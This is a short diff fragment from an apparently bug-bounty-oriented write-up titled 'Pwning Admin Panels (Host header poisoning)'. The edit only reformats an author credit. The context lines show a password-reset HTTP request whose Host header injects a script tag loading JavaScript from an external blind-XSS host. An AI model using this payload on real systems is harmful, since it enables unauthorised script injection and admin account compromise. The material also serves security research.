@@ -7,7 +7,7 @@
 
 # Pwning Admin Panels (Host header poisoning)
 
-## @hunter0x7
+**@hunter0x7**
 ```
 POST /admin/forgot_password HTTP/1.1
 Host: web..com"><script src=https://zasptiko.xss.ht></script>
